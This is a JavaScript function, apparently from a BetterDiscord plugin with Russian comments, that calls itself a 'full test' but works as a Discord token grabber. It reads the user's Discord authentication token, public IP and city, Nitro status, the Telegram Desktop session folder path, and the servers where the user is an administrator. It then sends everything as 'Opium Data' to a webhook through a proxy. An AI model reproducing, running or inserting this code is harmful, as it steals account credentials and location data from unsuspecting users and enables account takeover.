async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
    let result = {
        ip: null,
        location: null,
        nitro: "Нет",
        dtoken: null,
        telegram_path: "Не найден",
        debug: {
            appdata_env: process.env.APPDATA || "Переменная не найдена",
            errors: []
        },
        admin_servers: []
    };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
        }
    } catch (e) { result.debug.errors.push("IP Error: " + e.message); }

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType === 1) result.nitro = "Nitro Classic";
            else if (user.premiumType === 2) result.nitro = "Nitro";
            else if (user.premiumType === 3) result.nitro = "Nitro Basic";
        }
        
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) { result.debug.errors.push("User Error: " + e.message); }

    // 3. Формируем путь к Telegram (БЕЗ проверки существования файла)
    try {
        if (process.env.APPDATA) {
            // Просто собираем строку пути
            result.telegram_path = process.env.APPDATA + "\\Telegram Desktop\\tdata";
        }
    } catch (e) { 
        result.debug.errors.push("Telegram Error: " + e.message); 
    }

    // 4. Серверы и участники
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
                        count = GuildMemberCountStore.getMemberCount(g.id);
                    }
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
                                headers: { "Authorization": result.dtoken }
                            });
                            if (res.ok) {
                                const data = await res.json();
                                count = data.approximate_member_count || data.member_count || 0;
                            }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) { result.debug.errors.push("Guild Error: " + e.message); }

    // 5. Отправка на вебхук
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Opium Data**\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
            })
        });
        return response.ok;
    } catch (e) {
        return false;
    }
}
